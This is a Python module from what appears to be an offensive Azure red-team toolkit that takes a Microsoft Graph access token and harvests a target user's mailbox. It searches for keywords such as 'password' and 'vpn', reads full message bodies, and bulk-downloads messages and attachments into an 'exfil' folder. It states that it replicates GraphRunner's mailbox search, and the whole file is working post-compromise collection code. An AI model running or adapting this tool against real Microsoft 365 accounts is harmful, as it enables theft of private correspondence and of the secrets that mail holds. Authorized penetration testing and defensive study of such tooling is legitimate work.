# src/clouds/azure/modules/enumeration/graph_enumerate_mail.py

import json
import re
import requests
from datetime import datetime
from typing import List, Dict, Any, Optional

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm

from ...azure_session import AzureSessionManager
from ...utils.graph_helpers import (
    paginated_graph_request,
    graph_api_call,
    check_token_scopes
)

console = Console()

GRAPH_ENDPOINT = "https://graph.microsoft.com/v1.0"


def enumerate_mail(session_mgr: AzureSessionManager, user_id: Optional[str] = None) -> None:
    """
    Enumerate mail folders and messages using Microsoft Graph API.

    Allows users to:
    1. Search messages by keyword (like GraphRunner Invoke-SearchMailbox)
    2. Browse mail folders and messages

    Requires: Mail.Read scope (delegated or application)

    Args:
        session_mgr: Azure session manager
        user_id: Target user ID/UPN (required for application tokens, optional for delegated)
    """
    console.print("[cyan]Microsoft Graph - Mail Enumeration[/cyan]")

    # Get access token
    access_token = session_mgr.get_access_token(scope="graph")
    if not access_token:
        console.print("[red]No Graph API access token available. Please authenticate first.[/red]")
        return

    # Check token scopes (best-effort warning)
    check_token_scopes(access_token, ["Mail.Read"])

    # Ask for user ID if not provided (for application tokens)
    if not user_id:
        console.print("\n[dim]For application tokens, you must specify a target user ID/UPN.[/dim]")
        console.print("[dim]For delegated tokens, leave empty to use /me (current user).[/dim]")
        user_id = Prompt.ask("[cyan]Target user ID/UPN (leave empty for /me)[/cyan]", default="").strip()

    # Determine base URL
    if user_id:
        user_base = f"/users/{user_id}"
        console.print(f"[green]Targeting mailbox:[/green] {user_id}")
    else:
        user_base = "/me"
        console.print("[green]Targeting mailbox:[/green] current user (/me)")

    # Choose mode
    console.print("\n[dim]Select mode:[/dim]")
    console.print("  [bold]1[/bold]  Search by keyword  [dim](like GraphRunner Invoke-SearchMailbox)[/dim]")
    console.print("  [bold]2[/bold]  Browse mail folders")
    mode = Prompt.ask("Mode", choices=["1", "2"], default="1")

    if mode == "1":
        _search_mailbox(access_token, session_mgr, user_base)
        return

    # --- Browse mode ---

    # Ask user what they want to do
    list_folders = Confirm.ask("[cyan]List all mail folders first?[/cyan]", default=True)

    folders = []
    if list_folders:
        console.print("[dim]Fetching mail folders...[/dim]")
        folders = _list_mail_folders(access_token, session_mgr, user_base)

        # folders is None if there was an API error (403, 404, etc.)
        # folders is [] if the API succeeded but returned no folders
        if folders is None:
            console.print("[red]Failed to fetch mail folders due to an error (see above).[/red]")
            return

        if not folders:
            console.print("[yellow]Mailbox exists but contains no folders.[/yellow]")
            console.print("[dim]This may indicate a newly created account or empty mailbox.[/dim]")
            # Don't return - still allow user to try fetching messages directly
        else:
            _display_folders(folders)

    # Ask which folder to enumerate
    console.print("\n[cyan]Which folder would you like to enumerate?[/cyan]")
    console.print("[dim](Leave empty for Inbox, or enter folder name/ID)[/dim]")

    folder_input = Prompt.ask("[cyan]Folder", default="Inbox").strip()

    # Find folder by name or ID
    folder_id = None
    folder_name = "Inbox"

    if folder_input and folder_input.lower() != "inbox":
        # Try to find folder by name or ID
        for folder in folders:
            if (folder.get("displayName", "").lower() == folder_input.lower() or
                folder.get("id") == folder_input):
                folder_id = folder["id"]
                folder_name = folder.get("displayName", folder_input)
                break

        if not folder_id:
            # Assume it's a folder name that wasn't in the list
            folder_name = folder_input
            console.print(f"[yellow]Folder '{folder_input}' not found in list. Trying anyway...[/yellow]")

    # Enumerate messages
    console.print(f"\n[cyan]Enumerating messages in folder:[/cyan] {folder_name}")

    messages = _enumerate_messages(access_token, folder_id, folder_name, user_base)

    if not messages:
        console.print(f"[yellow]No messages found in {folder_name}.[/yellow]")
        return

    console.print(f"[green]Found {len(messages)} message(s).[/green]")

    # Save to session data
    session_mgr.save_enumeration_data(f"mail_{folder_name.lower().replace(' ', '_')}", messages)

    # Display messages
    _display_messages(messages, folder_name)

    # Offer to download full messages
    if Confirm.ask("\n[cyan]Download full message details to JSON?[/cyan]", default=False):
        _download_full_messages(access_token, messages, folder_name, session_mgr, user_base)


def _search_mailbox(access_token: str, session_mgr: AzureSessionManager, user_base: str) -> None:
    """
    Search mailbox messages by keyword using the Microsoft Search API.

    Replicates GraphRunner's Invoke-SearchMailbox.
    Uses POST /v1.0/search/query with entityTypes: ["message"].

    Requires: Mail.Read

    Args:
        access_token: Graph API token
        session_mgr: Session manager
        user_base: User base path (/me or /users/{userId})
    """
    search_term = Prompt.ask("[cyan]Search term (e.g. password, vpn, invoice)[/cyan]").strip()
    if not search_term:
        console.print("[red]Search term cannot be empty.[/red]")
        return

    page_size = 25
    from_offset = 0
    all_hits: List[Dict[str, Any]] = []

    console.print(f"\n[cyan]Searching mailbox for:[/cyan] {search_term}")

    while True:
        body = {
            "requests": [
                {
                    "entityTypes": ["message"],
                    "query": {"queryString": search_term},
                    "from": from_offset,
                    "size": page_size,
                    # Note: do NOT use "fields" for message entity — it causes the API
                    # to omit the `id` field from the resource, breaking individual fetch
                }
            ]
        }

        try:
            response = requests.post(
                f"{GRAPH_ENDPOINT}/search/query",
                headers={
                    "Authorization": f"Bearer {access_token}",
                    "Content-Type": "application/json",
                },
                json=body,
                timeout=30,
            )

            if response.status_code in (401, 403):
                try:
                    err = response.json()
                    err_code = err.get("error", {}).get("code", "")
                    err_msg = err.get("error", {}).get("message", response.text[:300])
                except Exception:
                    err_code = ""
                    err_msg = response.text[:300]

                if response.status_code == 401:
                    console.print(f"[red]Unauthorized (401): {err_msg}[/red]")
                    console.print("[dim]Token is expired or has the wrong audience. Use 'get_graph_token'.[/dim]")
                else:
                    console.print(f"[red]Permission denied (403):[/red] {err_code} — {err_msg}")
                    console.print("[dim]Mailbox search requires Mail.Read scope on a Graph token (get_graph_token).[/dim]")
                return

            if response.status_code != 200:
                console.print(f"[red]Search API error {response.status_code}: {response.text[:300]}[/red]")
                return

            data = response.json()
            value = data.get("value", [])
            if not value:
                break

            hits_container = value[0].get("hitsContainers", [])
            if not hits_container:
                break

            container = hits_container[0]
            hits = container.get("hits", [])
            total = container.get("total", 0)
            more_results = container.get("moreResultsAvailable", False)

            if from_offset == 0:
                console.print(f"[green]Total results: {total}[/green]")

            for hit in hits:
                resource = hit.get("resource", {})
                resource["_summary"] = hit.get("summary", "")
                # hitId is the message ID when the API omits 'id' from the resource
                if not resource.get("id") and hit.get("hitId"):
                    resource["id"] = hit["hitId"]
                all_hits.append(resource)

            console.print(f"[dim]Fetched {len(all_hits)}/{total} results...[/dim]")

            if not more_results or len(all_hits) >= total:
                break

            from_offset += page_size

        except requests.exceptions.RequestException as e:
            console.print(f"[red]Search request failed: {e}[/red]")
            return

    if not all_hits:
        console.print(f"[yellow]No messages found for '{search_term}'.[/yellow]")
        return

    console.print(f"[green]Found {len(all_hits)} message(s) for '{search_term}'.[/green]")

    # Save to session
    safe_term = search_term.replace(" ", "_").lower()[:30]
    session_mgr.save_enumeration_data(f"mail_search_{safe_term}", all_hits)

    # Display results
    display_limit = 50
    to_display = all_hits[:display_limit]

    table = Table(title=f"Mailbox Search: '{search_term}' ({len(all_hits)} results)")
    table.add_column("#", style="dim", justify="right", max_width=3)
    table.add_column("Subject", style="cyan", overflow="fold", max_width=42)
    table.add_column("From", style="green", overflow="fold", max_width=25)
    table.add_column("Preview", style="dim", overflow="fold", max_width=45)
    table.add_column("Received", style="yellow", max_width=17)
    table.add_column("Att.", style="magenta", justify="center", max_width=4)

    for idx, msg in enumerate(to_display, 1):
        subject = msg.get("subject", "(No Subject)") or "(No Subject)"

        # Sender
        from_data = msg.get("from", {})
        from_email_data = from_data.get("emailAddress", {}) if from_data else {}
        sender = from_email_data.get("name", "") or from_email_data.get("address", "")

        # Preview: prefer _summary (highlighted), then bodyPreview
        preview = msg.get("_summary", "").strip()
        if not preview:
            preview = (msg.get("bodyPreview", "") or "")[:120]

        # Date
        received_str = msg.get("receivedDateTime", "")
        if received_str:
            try:
                received = datetime.fromisoformat(received_str.replace("Z", "+00:00")).strftime("%Y-%m-%d %H:%M")
            except Exception:
                received = received_str[:16]
        else:
            received = ""

        has_att = "✓" if msg.get("hasAttachments") else ""

        table.add_row(str(idx), subject, sender, preview, received, has_att)

    console.print(table)

    if len(all_hits) > display_limit:
        console.print(f"[dim]... and {len(all_hits) - display_limit} more result(s)[/dim]")

    # Interactive full-message viewer
    console.print("\n[dim]Enter a message number to read the full body, or press Enter to skip.[/dim]")
    while True:
        pick = Prompt.ask("[cyan]Message #[/cyan]", default="").strip()
        if not pick:
            break
        try:
            idx = int(pick)
            if idx < 1 or idx > len(to_display):
                console.print(f"[yellow]Invalid number. Choose 1–{len(to_display)}.[/yellow]")
                continue
        except ValueError:
            console.print("[yellow]Enter a number or press Enter to skip.[/yellow]")
            continue

        msg = to_display[idx - 1]
        _view_full_message(access_token, msg, user_base)

    # Offer to download full messages to JSON
    if Confirm.ask("\n[cyan]Download full message details to JSON?[/cyan]", default=False):
        _download_search_results(access_token, all_hits, search_term, session_mgr, user_base)


def _view_full_message(access_token: str, msg: Dict[str, Any], user_base: str) -> None:
    """
    Fetch and display the full body of a message in the terminal.

    Fetches the complete message via GET {user_base}/messages/{id} with body included,
    strips HTML, and renders it inside a Rich Panel.

    Args:
        access_token: Graph API token
        msg: Message object with 'id' field
        user_base: User base path (/me or /users/{userId})
    """
    msg_id = msg.get("id")
    if not msg_id:
        console.print("[red]Cannot fetch message: missing ID.[/red]")
        return

    console.print("[dim]Fetching full message...[/dim]")

    url = (
        f"{GRAPH_ENDPOINT}{user_base}/messages/{msg_id}"
        "?$select=subject,from,toRecipients,ccRecipients,bccRecipients,"
        "receivedDateTime,hasAttachments,importance,isRead,body,attachments"
    )
    full_msg = graph_api_call(access_token, "GET", url)

    if not full_msg:
        console.print("[red]Failed to fetch message.[/red]")
        return

    # --- Header ---
    subject = full_msg.get("subject", "(No Subject)") or "(No Subject)"

    from_data = full_msg.get("from", {})
    from_email_data = from_data.get("emailAddress", {}) if from_data else {}
    sender_name = from_email_data.get("name", "")
    sender_addr = from_email_data.get("address", "")
    sender = f"{sender_name} <{sender_addr}>" if sender_name else sender_addr

    def _fmt_recipients(recipients: list) -> str:
        parts = []
        for r in (recipients or []):
            ea = r.get("emailAddress", {})
            n, a = ea.get("name", ""), ea.get("address", "")
            parts.append(f"{n} <{a}>" if n else a)
        return ", ".join(parts) if parts else ""

    to_str = _fmt_recipients(full_msg.get("toRecipients", []))
    cc_str = _fmt_recipients(full_msg.get("ccRecipients", []))

    received_str = full_msg.get("receivedDateTime", "")
    if received_str:
        try:
            received = datetime.fromisoformat(received_str.replace("Z", "+00:00")).strftime("%Y-%m-%d %H:%M")
        except Exception:
            received = received_str[:16]
    else:
        received = ""

    has_att = full_msg.get("hasAttachments", False)

    # --- Body ---
    body_obj = full_msg.get("body", {})
    content_type = body_obj.get("contentType", "text") if body_obj else "text"
    raw_body = body_obj.get("content", "") if body_obj else ""

    if content_type == "html":
        # Strip HTML tags and collapse whitespace
        text_body = re.sub(r"<style[^>]*>.*?</style>", "", raw_body, flags=re.DOTALL | re.IGNORECASE)
        text_body = re.sub(r"<script[^>]*>.*?</script>", "", text_body, flags=re.DOTALL | re.IGNORECASE)
        text_body = re.sub(r"<br\s*/?>", "\n", text_body, flags=re.IGNORECASE)
        text_body = re.sub(r"<p[^>]*>", "\n", text_body, flags=re.IGNORECASE)
        text_body = re.sub(r"</p>", "", text_body, flags=re.IGNORECASE)
        text_body = re.sub(r"<[^>]+>", "", text_body)
        text_body = re.sub(r"&nbsp;", " ", text_body)
        text_body = re.sub(r"&amp;", "&", text_body)
        text_body = re.sub(r"&lt;", "<", text_body)
        text_body = re.sub(r"&gt;", ">", text_body)
        text_body = re.sub(r"&quot;", '"', text_body)
        text_body = re.sub(r"&#39;", "'", text_body)
        # Collapse excessive blank lines
        text_body = re.sub(r"\n{3,}", "\n\n", text_body).strip()
    else:
        text_body = raw_body.strip()

    # --- Render ---
    header_lines = [
        f"[bold]Subject:[/bold] {subject}",
        f"[bold]From:[/bold]    {sender}",
        f"[bold]To:[/bold]      {to_str}",
    ]
    if cc_str:
        header_lines.append(f"[bold]CC:[/bold]      {cc_str}")
    header_lines.append(f"[bold]Date:[/bold]    {received}")
    if has_att:
        header_lines.append("[bold]Attachments:[/bold] ✓")

    header_text = "\n".join(header_lines)
    body_separator = "─" * 60
    full_content = f"{header_text}\n{body_separator}\n{text_body}"

    console.print(Panel(
        full_content,
        title=f"[cyan]{subject[:70]}[/cyan]",
        border_style="cyan",
        expand=True,
    ))


def _download_search_results(
    access_token: str,
    hits: List[Dict[str, Any]],
    search_term: str,
    session_mgr: AzureSessionManager,
    user_base: str
) -> None:
    """Fetch full message body+attachments for each search hit and save to JSON.

    Args:
        access_token: Graph API token
        hits: List of message hits from search
        search_term: Search keyword
        session_mgr: Session manager
        user_base: User base path (/me or /users/{userId})
    """
    console.print(f"\n[cyan]Downloading full details for {len(hits)} message(s)...[/cyan]")

    full_messages = []

    for i, msg in enumerate(hits, 1):
        msg_id = msg.get("id")
        if not msg_id:
            continue

        console.print(f"[dim]Fetching message {i}/{len(hits)}...[/dim]")

        url = (
            f"{GRAPH_ENDPOINT}{user_base}/messages/{msg_id}"
            "?$select=id,subject,from,toRecipients,ccRecipients,bccRecipients,"
            "receivedDateTime,sentDateTime,hasAttachments,importance,isRead,body,bodyPreview"
        )
        full_msg = graph_api_call(access_token, "GET", url)

        if full_msg:
            if full_msg.get("hasAttachments"):
                att_data = graph_api_call(access_token, "GET", f"{GRAPH_ENDPOINT}{user_base}/messages/{msg_id}/attachments")
                if att_data and "value" in att_data:
                    full_msg["attachments"] = att_data["value"]
            full_messages.append(full_msg)

    if not full_messages:
        console.print("[yellow]No messages could be downloaded.[/yellow]")
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_term = search_term.replace(" ", "_").replace("/", "_")[:30]
    filename = f"mail_search_{safe_term}_{timestamp}.json"
    exfil_dir = session_mgr.get_exfil_dir("mail")
    file_path = exfil_dir / filename

    try:
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(full_messages, f, indent=2, ensure_ascii=False)
        console.print(f"[green]Saved {len(full_messages)} message(s) to:[/green] {file_path}")
        session_mgr.save_enumeration_data(f"mail_search_{safe_term}_full", full_messages)
    except Exception as e:
        console.print(f"[red]Failed to save: {e}[/red]")


def _list_mail_folders(access_token: str, session_mgr: AzureSessionManager, user_base: str) -> Optional[List[Dict[str, Any]]]:
    """
    List all mail folders in the mailbox.

    Args:
        access_token: Graph API token
        session_mgr: Session manager
        user_base: User base path (/me or /users/{userId})

    Returns:
        List of folders if successful, None if there was an API error, empty list if mailbox exists but has no folders
    """
    url = f"{GRAPH_ENDPOINT}{user_base}/mailFolders"

    folders = paginated_graph_request(access_token, url)

    # Save to session data only if we got results (not None)
    if folders:
        session_mgr.save_enumeration_data("mail_folders", folders)

    return folders


def _display_folders(folders: List[Dict[str, Any]]) -> None:
    """Display mail folders in a table."""
    table = Table(title=f"Mail Folders ({len(folders)} found)")
    table.add_column("Display Name", style="cyan", overflow="fold")
    table.add_column("ID", style="dim", overflow="fold")
    table.add_column("Total Items", style="yellow", justify="right")
    table.add_column("Unread Items", style="red", justify="right")
    table.add_column("Child Folder Count", style="magenta", justify="right")

    for folder in folders:
        display_name = folder.get("displayName", "")
        folder_id = folder.get("id", "")
        total = str(folder.get("totalItemCount", 0))
        unread = str(folder.get("unreadItemCount", 0))
        child_count = str(folder.get("childFolderCount", 0))

        table.add_row(display_name, folder_id, total, unread, child_count)

    console.print(table)


def _enumerate_messages(
    access_token: str,
    folder_id: str = None,
    folder_name: str = "Inbox",
    user_base: str = "/me"
) -> List[Dict[str, Any]]:
    """
    Enumerate messages in a specific folder.

    Args:
        access_token: Graph API token
        folder_id: Folder ID (None for Inbox)
        folder_name: Folder display name for error messages
        user_base: User base path (/me or /users/{userId})

    Returns:
        List of message summaries
    """
    if folder_id:
        url = f"{GRAPH_ENDPOINT}{user_base}/mailFolders/{folder_id}/messages"
    else:
        # Default to all messages (Inbox is default)
        url = f"{GRAPH_ENDPOINT}{user_base}/messages"

    # Select specific fields to reduce payload size
    url += "?$select=id,subject,from,toRecipients,receivedDateTime,hasAttachments,isRead,importance,bodyPreview"
    url += "&$top=100"  # Fetch 100 messages per page

    messages = paginated_graph_request(access_token, url, limit=1000)  # Limit to 1000 messages

    return messages


def _display_messages(messages: List[Dict[str, Any]], folder_name: str) -> None:
    """Display messages in a table."""
    # Limit display to first 50 messages
    display_limit = 50
    messages_to_display = messages[:display_limit]

    table = Table(title=f"Messages in {folder_name} (showing {len(messages_to_display)} of {len(messages)})")
    table.add_column("Subject", style="cyan", overflow="fold", max_width=50)
    table.add_column("From", style="green", overflow="fold", max_width=30)
    table.add_column("Received", style="yellow", max_width=20)
    table.add_column("Attachments", style="magenta", justify="center")
    table.add_column("Read", style="dim", justify="center")

    for msg in messages_to_display:
        subject = msg.get("subject", "(No Subject)")

        # Extract sender email
        from_data = msg.get("from", {})
        from_email = from_data.get("emailAddress", {}).get("address", "")
        from_name = from_data.get("emailAddress", {}).get("name", from_email)

        # Parse received date
        received_str = msg.get("receivedDateTime", "")
        if received_str:
            try:
                received_dt = datetime.fromisoformat(received_str.replace('Z', '+00:00'))
                received = received_dt.strftime("%Y-%m-%d %H:%M")
            except:
                received = received_str[:16]
        else:
            received = ""

        has_attachments = "✓" if msg.get("hasAttachments") else ""
        is_read = "✓" if msg.get("isRead") else ""

        table.add_row(subject, from_name, received, has_attachments, is_read)

    console.print(table)

    if len(messages) > display_limit:
        console.print(f"[dim]... and {len(messages) - display_limit} more message(s)[/dim]")


def _download_full_messages(
    access_token: str,
    messages: List[Dict[str, Any]],
    folder_name: str,
    session_mgr: AzureSessionManager,
    user_base: str
) -> None:
    """
    Download full message details including body and attachments metadata.

    Args:
        access_token: Graph API token
        messages: List of message summaries
        folder_name: Folder name for filename
        session_mgr: Session manager for saving data
        user_base: User base path (/me or /users/{userId})
    """
    console.print(f"\n[cyan]Downloading full details for {len(messages)} message(s)...[/cyan]")

    full_messages = []

    for i, msg in enumerate(messages, 1):
        msg_id = msg.get("id")
        if not msg_id:
            continue

        console.print(f"[dim]Fetching message {i}/{len(messages)}...[/dim]")

        # Get full message details
        url = f"{GRAPH_ENDPOINT}{user_base}/messages/{msg_id}"
        url += "?$select=id,subject,from,toRecipients,ccRecipients,bccRecipients,receivedDateTime,sentDateTime,hasAttachments,importance,isRead,body,bodyPreview"

        full_msg = graph_api_call(access_token, "GET", url)

        if full_msg:
            # Get attachments if present
            if full_msg.get("hasAttachments"):
                attachments_url = f"{GRAPH_ENDPOINT}{user_base}/messages/{msg_id}/attachments"
                attachments_data = graph_api_call(access_token, "GET", attachments_url)

                if attachments_data and "value" in attachments_data:
                    full_msg["attachments"] = attachments_data["value"]

            full_messages.append(full_msg)

    if not full_messages:
        console.print("[yellow]No messages could be downloaded.[/yellow]")
        return

    # Save to JSON file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"mail_{folder_name.lower().replace(' ', '_')}_{timestamp}.json"
    exfil_dir = session_mgr.get_exfil_dir("mail")
    file_path = exfil_dir / filename

    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(full_messages, f, indent=2, ensure_ascii=False)

        console.print(f"[green]Downloaded {len(full_messages)} message(s) to:[/green] {file_path}")

        # Also save to session data
        session_mgr.save_enumeration_data(f"mail_{folder_name.lower().replace(' ', '_')}_full", full_messages)

    except Exception as e:
        console.print(f"[red]Failed to save messages: {e}[/red]")
